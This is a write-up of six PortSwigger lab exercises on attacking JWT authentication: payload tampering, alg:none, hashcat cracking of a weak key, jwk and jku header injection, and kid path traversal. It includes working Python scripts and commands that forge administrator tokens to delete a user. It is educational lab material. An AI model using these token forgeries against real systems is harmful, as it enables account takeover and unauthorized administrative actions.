# Portswigger Writeups

## Lab 1: Unverified Signature

This lab fails to verify the signature of the JWT token. To solve the lab, delete `carlos` as the site admin.

When logged in as `wiener`, the first thing I observed was the JWT session cookie:

![](../../.gitbook/assets/portswigger-jwt-writeup-image.png)

Here's the contents of the token:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-1.png)

I can abuse this by changing the middle portion of the cookie (payload). I changed the `sub` value from `wiener` to `administrator`, then `base64` encoded it and placed it back in the cookie.

```
$ echo '{"iss":"portswigger","exp":1708789013,"sub":"administrator"}  ' |base64 
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcwODc4OTAxMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9ICAK
```

Note that the usage of space characters was to remove the `=` characters that appeared. While not actually necessary, I thought it would make the value look cleaner.

I could then access the `administrator` account.

![](../../.gitbook/assets/portswigger-jwt-writeup-image-2.png)

Afterwards, a request can be sent to `/admin/delete?username=carlos` to solve the lab.

Here's a little script I made to enumerate the cookie values, then solve the lab.

```python
import requests
import re
import sys
import subprocess
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0aa3004303f362a682041b960040008c'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
s = requests.Session()
csrf_r = requests.get(url + '/login', verify=False, proxies=proxies)
match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', csrf_r.text)
csrf_token = match[1]
wiener_data = {
	'csrf':match[1],
	'username':'wiener',
	'password':'peter'
}

r = s.post(url + '/login', verify=False, proxies=proxies, data=wiener_data)
default_jwt = s.cookies['session']
values = default_jwt.split(".")

for v in values:
	command = f'echo {v} | base64 -d 2> /dev/null'
	result = subprocess.run(command, shell=True, capture_output=True).stdout
	print(result)
```

## Lab 2: Flawed Signature Verification

To solve this lab, delete `carlos` as the administrator. 

This lab said that it had a faulty signature verification, meaning I should be able to set the signature value to `none` and remove the signature.

This works because if there's no algorithm used, then there's no signature expected. Thus, it is a 'valid' cookie.

Here's the exploit script I used:

```python
import requests
import re
import sys
import subprocess
import urllib.parse
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0aa3004303f362a682041b960040008c'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
s = requests.Session()


csrf_r = requests.get(url + '/login', verify=False, proxies=proxies)
match = re.search('name="csrf" value="([0-9a-zA-z]+)', csrf_r.text)
csrf_token = match[1]
wiener_data = {
	'csrf':match[1],
	'username':'wiener',
	'password':'peter'
}

r = s.post(url + '/login', verify=False, proxies=proxies, data=wiener_data)
default_jwt = s.cookies['session']
values = default_jwt.split(".")

print('Cookie values are:')
for v in values:
	command = f'echo {v} | base64 -d 2> /dev/null'
	result = subprocess.run(command, shell=True, capture_output=True).stdout
	print(result)

print('Encoding new cookie...')
new_signature = '{"kid":"959f7574-9fbf-4e84-8f78-9ae820ff5236","alg":"none"}'.encode('ascii')
encoded_signature = base64.b64encode(new_signature).decode('ascii')
values[0] = encoded_signature

new_payload = '{"iss":"portswigger","exp":1708790745,"sub":"administrator"}'.encode('ascii')
encoded_payload = base64.b64encode(new_payload).decode('ascii')
values[1] = encoded_payload
values[2] = ''

new_cookie = ".".join(values)
new_cookie = urllib.parse.quote(new_cookie)
print('[+] New Cookie is: ' + new_cookie)

cookies = {
	'session':new_cookie
}

requests.get(url + '/admin/delete?username=carlos', cookies=cookies, proxies=proxies, verify=False)
```

## Lab 3: Weak Signing Key

To solve lab, delete `carlos` as the administrator. This lab tells me that there is a weak signature key used for this, meaning it is brute-forceable.

To solve this lab, let's try to crack the JWT token using `hashcat`:

```
$ cat jwt.txt
eyJraWQiOiJiODhmNGEwYi1lOTU0LTQzMmQtYThjYS01MjIzMmRlNGQ5YmIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcwODc5MTI0Niwic3ViIjoid2llbmVyIn0.VU9-InVBknUg4LexZAhOCDahpM38VYvDYMBH4csbsGk

$ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

eyJraWQiOiJiODhmNGEwYi1lOTU0LTQzMmQtYThjYS01MjIzMmRlNGQ5YmIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcwODc5MTI0Niwic3ViIjoid2llbmVyIn0.VU9-InVBknUg4LexZAhOCDahpM38VYvDYMBH4csbsGk:secret1
```

So the secret used to encode this thing is `secret1`.

Using `pyjwt`, I can create a new JWT token.

```python
payload = {"iss":"portswigger","exp":1708791246,"sub":"administrator"}
new_cookie = jwt.encode(payload, "secret1", algorithm="HS256")

cookies = {
	'session':new_cookie
}

requests.get(url + '/admin/delete?username=carlos', cookies=cookies, proxies=proxies, verify=False)
```

Note that the `pyjwt` library is only usable if I'm creating 'legit' tokens. All other funny exploit methods that involve deforming the token is easier exploited using `base64` encoding directly (in my opinion).

## Lab 4: jwk Injection

To solve this lab, delete `carlos`. This lab supports the `jwk` parameter in the JWT header. JWK stands for JSON Web Key, which is the set of keys used to verify the validity of JWT tokens.

Here's the contents of the cookie:

```
[+] Cookie values are:
b'{"kid":"124fee5c-e391-496e-ac66-b7f85f2c4c63","alg":"RS256"}'
b'{"iss":"portswigger","exp":1708791576,"sub":"wiener"}'
```

I noticed that this uses RS256, an asymmetric algorithm. Since the lab requires us to inject my own `jwk` header into the token, I can create a new key, sign the token, and then place my own public key there.

Using the JWT Editor extension for Burpsuite, I can generate a new set of keys:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-3.png)

Afterwards, I can head to any requests with the cookie value, and use the JSON Web Token tab.

Change the `sub` to `administrator` and use the "Embedded JWK" attack:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-4.png)

Sign the new token:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-5.png)

Afterwards, the cookie value changes to this absurdly long one:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-6.png)

When decoded, it gives this:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-7.png)

This can be scripted as usual. It's rather similar to the script in Lab 2 with `base64` encoding, so I'm not going to bother.

## Lab 5: jku Injection

To solve this lab, delete `carlos` as the administrator. I am given the exploit server. The `jku` header of a JWT token is a link to a valid JWKS. 

Since I am given an exploit server, I can actually spoof this. After creating a new key pair in the JWT Editor, copy it JWK and store it on the exploit server like this:

```
{
    "keys": [
	{
		"kty": "RSA",
		"e": "AQAB",
		"kid": "b6eaab12-c0a8-4a04-a106-16f14393e224",
		"n": "yQ29FRF61MwnPV78oyGosARwe8YgHhtp8IvQIPwbzbTn4sdhgGAfL4tPgLNAGjFeQWEn6u3hEj4aI5sSBsWuti4W9G1TYC44dIWNF7d8RgiMKKChAvF2cLqh0OiccLe8FvGgCNKaE0fEx54bSdER9VYfEBqZVTztCXUCk5S-SE4Omvsj6bnpvQUzFZumw3-TB1TEaBnL04BquuhJttVsB2S4D9hwWZFenjSD0SdR6nYFo-I7boxRYPEImKPdpA6owfc2rv-VJRx9TxRthCaqtUH60neq-b0cvhVq7TafWN1AgJgTwtiGhNxsbj_YU_ar9u47I4MPu-ZG9QRL0nRkUQ"
	}
]
}
```

Afterwards, using JWT Editor, I can inject change the `kid` value within the JWT header, and also the user:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-8.png)

Afterwards, sign the token, then use it to send a GET request to `/admin/delete?username=carlos`.

## Lab 6: kid Header Path Traversal

To solve this lab, delete `carlos`. There is a path traversal within the `kid` parameter, which allows us to fetch the key from the file system.

Just replace this value with `../../../../../../../dev/null`. Afterwards, sign this key with a new symmetric key. 

Since we effectively removed the `kid` value, there is an empty key that is used to sign the token. As such, our symmetric key has to be an empty string:

![](../../.gitbook/assets/portswigger-jwt-writeup-image-9.png)

After signing the token and changing the username, delete `carlos`.

